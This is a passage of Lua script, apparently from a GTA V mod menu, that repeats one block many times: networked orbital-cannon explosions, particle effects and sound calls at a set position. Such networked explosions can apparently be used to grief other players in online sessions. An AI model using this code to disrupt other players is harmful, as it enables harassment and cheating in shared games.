				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
